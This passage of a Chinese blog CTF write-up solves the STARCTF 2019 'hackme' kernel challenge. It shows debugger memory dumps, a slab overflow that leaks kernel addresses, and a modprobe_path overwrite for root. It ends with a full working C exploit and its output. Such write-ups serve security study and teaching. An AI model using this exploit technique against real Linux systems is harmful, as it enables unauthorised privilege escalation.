hackme_exit	[hackme]</span><br><span class="line">ffffffffc0000170 t hackme_init	[hackme]</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x /<span class="number">20</span>gx <span class="number">0xffffffff81811000</span></span><br><span class="line"><span class="number">0xffffffff81811000</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0xffffffffc0002320</span></span><br><span class="line"><span class="number">0xffffffff81811010</span>:	<span class="number">0xffffffffc0002338</span>	<span class="number">0xffffffffc0000000</span></span><br><span class="line"><span class="number">0xffffffff81811020</span>:	<span class="number">0xffffffffc0006000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffffff81811030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffffff81811040</span>:	<span class="number">0xffffffff81811040</span>	<span class="number">0xffffffff81811040</span></span><br><span class="line"><span class="number">0xffffffff81811050</span>:	<span class="number">0xffffffff81811050</span>	<span class="number">0xffffffff81811050</span></span><br><span class="line"><span class="number">0xffffffff81811060</span>:	<span class="number">0xffffffff81811060</span>	<span class="number">0xffffffff81811060</span></span><br><span class="line"><span class="number">0xffffffff81811070</span>:	<span class="number">0xffffffff81811070</span>	<span class="number">0xffffffff81811070</span></span><br></pre></td></tr></table></figure>
+<p>溢出修改<code>fd</code>以后，可以发现原有第<code>3</code>块内存变为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0xffff88800017a800</span></span><br><span class="line"><span class="number">0xffff88800017a800</span>:	<span class="number">0xffffffff81811040</span>	<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffff88800017a810</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0xffff88800017a820</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span></span><br></pre></td></tr></table></figure>
+<p>连续<code>alloc</code>两次以后可以拿到内核地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0xffffffffc0002400</span></span><br><span class="line"><span class="number">0xffffffffc0002400</span>:	<span class="number">0xffff88800017a500</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002420</span>:	<span class="number">0xffff88800017a700</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002440</span>:	<span class="number">0xffff88800017a900</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002450</span>:	<span class="number">0xffff88800017a800</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002460</span>:	<span class="number">0xffffffff81811040</span>	<span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure>
+<p>此时，我们就可以得到内核模块<code>hackme</code>的基址了。其中在修改时尽量用负数越界读的方法泄露地址，防止复制毁坏数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(mem,<span class="string">'A'</span>,<span class="number">0x100</span>);</span><br><span class="line">*((<span class="keyword">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">mod_addr =  *((<span class="keyword">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] mod addr : %16llx\n"</span>,mod_addr );</span><br></pre></td></tr></table></figure>
+<h2 id="内存任意写"><a href="#内存任意写" class="headerlink" title="内存任意写"></a>内存任意写</h2><p>当泄露了内核基址以后，利用同样的方法，我们可以将保持堆地址大小及堆地址的<code>.bss</code>段上的<code>pool</code>申请下来。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span>(fd,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">delete</span>(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">*((<span class="keyword">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br></pre></td></tr></table></figure>
+<p>可见，在第<code>8</code>块，我们拿到了自己本身的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0xffffffffc0002400</span></span><br><span class="line"><span class="number">0xffffffffc0002400</span>:	<span class="number">0xffff88800017a500</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002440</span>:	<span class="number">0xffff88800017a900</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002460</span>:	<span class="number">0xffffffff81811040</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002470</span>:	<span class="number">0xffff88800017a800</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002480</span>:	<span class="number">0xffffffffc00024c0</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0xffffffffc0002490</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>这样一个交叠的结构，可以使我们向<code>pool</code>项中增加任意想写的地址和大小，造成任意地址写。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>以上就解决了我们在抛砖引玉章节提出的控制写长度的问题了。在这个部分以后，提升权限的方法有很多，可以参考之前写过的<a href="http://p4nda.top/2018/11/07/stringipc/">【KERNEL PWN】从内存任意读写到权限提升</a>一文。</p>
+<p>在翻<code>wp</code>的过程中，发现一种很有意思的解法，通过任意写修改<code>modprobe_path</code>内容，利用一个非正确格式的<code>ELF</code>文件触发。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*((<span class="keyword">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">*((<span class="keyword">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">write_to_kernel(fd,<span class="number">8</span>,mem,<span class="number">0x10</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">"/home/pwn/copy.sh\0"</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/dummy"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/dummy"</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"/home/pwn/dummy"</span>);</span><br><span class="line">system(<span class="string">"cat flag"</span>);</span><br></pre></td></tr></table></figure>
+<p>起初依稀记得哪里用到过，后来发现依然来源于<code>dong-hoon you (x82)</code>的<code>New Reliable Android Kernel Root Exploitation Techniques</code>，和之前写过的修改<code>poweroff_cmd</code>异曲同工。</p>
+<p>最终结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@ubuntu] - [~/Desktop/pwn/hackme] - [Wed May 01, 06:36]</span><br><span class="line">└─[$] &lt;&gt; ./startvm.sh</span><br><span class="line"></span><br><span class="line">        <span class="comment">#   #    ####    #####  ######</span></span><br><span class="line">         <span class="comment"># #    #    #     #    #</span></span><br><span class="line">       <span class="comment">### ###  #          #    #####</span></span><br><span class="line">         <span class="comment"># #    #          #    #</span></span><br><span class="line">        <span class="comment">#   #   #    #     #    #</span></span><br><span class="line">                 <span class="comment">####      #    #</span></span><br><span class="line"></span><br><span class="line">~ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">~ $ cat /f</span><br><span class="line">flag   fs.sh</span><br><span class="line">~ $ cat /flag </span><br><span class="line">cat: can<span class="string">'t open '</span>/flag<span class="string">': Permission denied</span></span><br><span class="line"><span class="string">~ $ ./exp</span></span><br><span class="line"><span class="string">[+] heap addr : ffffa1d70017a600</span></span><br><span class="line"><span class="string">[+] kernel addr : ffffffffb1e00000</span></span><br><span class="line"><span class="string">[+] mod addr : ffffffffc00fc000</span></span><br><span class="line"><span class="string">/home/pwn/dummy: line 1: ����: not found</span></span><br><span class="line"><span class="string">*CTF&#123;test&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEL 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE 0x30002</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> idx;</span><br><span class="line">	<span class="keyword">void</span> *addr;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> len;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">alloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx,<span class="keyword">char</span> *user,<span class="keyword">long</span> <span class="keyword">long</span> len)</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	ioctl(fd,ALLOC,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	ioctl(fd,DEL,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_from_kernel</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx,<span class="keyword">char</span> *user,<span class="keyword">long</span> <span class="keyword">long</span> len,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,READ,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_to_kernel</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx,<span class="keyword">char</span> *user,<span class="keyword">long</span> <span class="keyword">long</span> len,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,WRITE,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">( <span class="keyword">char</span> *buf,<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"======================================"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"data :\n"</span>);</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d"</span>,i/<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">" %16llx"</span>,*(<span class="keyword">size_t</span> * )(buf + i*<span class="number">8</span>));</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"======================================"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/hackme"</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="keyword">size_t</span> heap_addr , kernel_addr,mod_addr;</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[-] bad open /dev/hackme\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">'A'</span>,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">delete</span>(fd,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">delete</span>(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	heap_addr = *((<span class="keyword">size_t</span>  *)mem);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] heap addr : %16llx\n"</span>,heap_addr );</span><br><span class="line">	read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">	kernel_addr = *((<span class="keyword">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line">	<span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[-] maybe bad kernel leak : %16llx\n"</span>,kernel_addr);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] kernel addr : %16llx\n"</span>,kernel_addr );	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">'A'</span>,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="keyword">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	</span><br><span class="line">	alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">	mod_addr =  *((<span class="keyword">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] mod addr : %16llx\n"</span>,mod_addr );	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">delete</span>(fd,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">delete</span>(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	*((<span class="keyword">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//*((size_t *)mem) = (0x83f480 + kernel_addr ); //poweroff_cmd</span></span><br><span class="line">	*((<span class="keyword">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">	*((<span class="keyword">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">8</span>,mem,<span class="number">0x10</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strncpy</span>(mem,<span class="string">"/home/pwn/copy.sh\0"</span>,<span class="number">18</span>);</span><br><span class="line">	write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span>);</span><br><span class="line">	system(<span class="string">"chmod +x /home/pwn/copy.sh"</span>);</span><br><span class="line">	system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/dummy"</span>);</span><br><span class="line">	system(<span class="string">"chmod +x /home/pwn/dummy"</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"/home/pwn/dummy"</span>);</span><br><span class="line">	system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://kileak.github.io/ctf/2019/xctf-hackme/" target="_blank" rel="noopener">https://kileak.github.io/ctf/2019/xctf-hackme/</a></p>
+<p>[2] <a href="https://github.com/perfectblue/ctf-writeups/tree/master/midnightsun-ctf-2019-quals/HFSIPC" target="_blank" rel="noopener">https://github.com/perfectblue/ctf-writeups/tree/master/midnightsun-ctf-2019-quals/HFSIPC</a></p>
+<p>[3] New Reliable Android Kernel Root Exploitation Techniques： <a href="http://t.cn/Rftu7Dn" target="_blank" rel="noopener">http://t.cn/Rftu7Dn</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/05/01/starctf-2019-hackme/">STARCTF 2019 hackme 解题思路</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
+        <p><span>发布时间:</span>2019-05-01, 19:10:10</p>
+        <p><span>最后更新:</span>2019-05-01, 21:43:54</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/01/starctf-2019-hackme/" title="STARCTF 2019 hackme 解题思路">http://p4nda.top/2019/05/01/starctf-2019-hackme/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2019/05/01/starctf-2019-hackme/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/02/16/CVE-2017-7184/">
+                    Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
